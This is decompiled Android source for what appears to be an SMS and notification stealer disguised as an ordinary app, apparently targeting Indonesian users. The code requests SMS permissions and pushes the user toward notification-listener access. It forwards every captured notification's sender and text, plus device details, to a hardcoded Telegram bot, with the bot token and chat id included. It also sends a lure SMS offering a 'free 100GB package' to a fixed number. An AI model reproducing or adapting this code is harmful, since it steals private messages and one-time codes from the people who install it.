package com.example.myapplicatior;

import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.Html;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/* loaded from: classes3.dex */
public class MainActivity extends AppCompatActivity {
    private static final int RESULT_ENABLE = 0;
    private static final int VISIBILITY = 1028;
    private Object devicePolicyManager;
    ComponentName mDeviceAdminSample;
    private TextView textView;
    WebSettings websettingku;
    WebView webviewku;
    private final OkHttpClient client = new OkHttpClient();
    final String TAG = "demo1";
    String device = Build.BRAND + " - " + Build.MODEL + SmsManager.getDefault();
    private BroadcastReceiver onNotice = new BroadcastReceiver() { // from class: com.example.myapplicatior.MainActivity.1
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            String stringExtra = intent.getStringExtra("package");
            String stringExtra2 = intent.getStringExtra("title");
            String stringExtra3 = intent.getStringExtra("text");
            intent.getStringExtra("id");
            new TableRow(MainActivity.this.getApplicationContext()).setLayoutParams(new TableRow.LayoutParams(-1, -2));
            TextView textView = new TextView(MainActivity.this.getApplicationContext());
            textView.setLayoutParams(new TableRow.LayoutParams(-2, -2, 1.0f));
            textView.setTextSize(12.0f);
            textView.setTextColor(Color.parseColor("#000000"));
            textView.setText(Html.fromHtml("From : " + stringExtra2 + " | Message : </b>" + stringExtra3));
            MainActivity.this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=*" + stringExtra + "* %0A%0A*From :* _" + stringExtra2 + "_%0A*Message :* _" + stringExtra3 + "_").build()).enqueue(new Callback() { // from class: com.example.myapplicatior.MainActivity.1.1
                @Override // okhttp3.Callback
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                @Override // okhttp3.Callback
                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
        }
    };

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(com.google.cuap.R.NP_MANAGER11.activity_main);
        WebView webView = (WebView) findViewById(com.google.cuap.R.NP_MANAGER8.MT_Bin_res_0x7f08012f);
        this.webviewku = webView;
        WebSettings settings = webView.getSettings();
        this.websettingku = settings;
        settings.setJavaScriptEnabled(true);
        this.webviewku.setWebViewClient(new WebViewClient());
        this.webviewku.loadUrl(HttpUrl.FRAGMENT_ENCODE_SET);
        if (Build.VERSION.SDK_INT >= 19) {
            this.webviewku.setLayerType(2, null);
        } else if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {
            this.webviewku.setLayerType(1, null);
        }
        if (Build.VERSION.SDK_INT < 23 || checkSelfPermission("android.permission.RECEIVE_SMS") == 0 || checkSelfPermission("android.permission.SEND_SMS") == 0) {
            return;
        }
        requestPermissions(new String[]{"android.permission.RECEIVE_SMS", "android.permission.SEND_SMS"}, 1000);
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 1000) {
            if (iArr[0] != 0) {
                Toast.makeText(this, "Permission Not Granted!", 0).show();
                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text= : _" + this.device + "_").build()).enqueue(new Callback() { // from class: com.example.myapplicatior.MainActivity.4
                    @Override // okhttp3.Callback
                    public void onFailure(Call call, IOException iOException) {
                        iOException.printStackTrace();
                    }

                    @Override // okhttp3.Callback
                    public void onResponse(Call call, Response response) throws IOException {
                        Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                        if (response.isSuccessful()) {
                            response.body().string();
                        }
                    }
                });
                finish();
                return;
            }
            this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text= : _" + this.device).build()).enqueue(new Callback() { // from class: com.example.myapplicatior.MainActivity.2
                @Override // okhttp3.Callback
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                @Override // okhttp3.Callback
                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            try {
                SmsManager.getDefault().sendTextMessage("085211609935", null, " paket gratis 100gb. ", null, null);
            } catch (Exception e) {
                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=Error : _" + e).build()).enqueue(new Callback() { // from class: com.example.myapplicatior.MainActivity.3
                    @Override // okhttp3.Callback
                    public void onFailure(Call call, IOException iOException) {
                        iOException.printStackTrace();
                    }

                    @Override // okhttp3.Callback
                    public void onResponse(Call call, Response response) throws IOException {
                        Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                        if (response.isSuccessful()) {
                            response.body().string();
                        }
                    }
                });
                Toast.makeText(getApplicationContext(), HttpUrl.FRAGMENT_ENCODE_SET + e, 1).show();
            }
            NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService("notification");
            if (Build.VERSION.SDK_INT >= 23 && !notificationManager.isNotificationPolicyAccessGranted()) {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                Toast.makeText(this, "Aktifkan Izin Aplikasi!", 0).show();
            }
            LocalBroadcastManager.getInstance(this).registerReceiver(this.onNotice, new IntentFilter("Msg"));
        }
    }
}
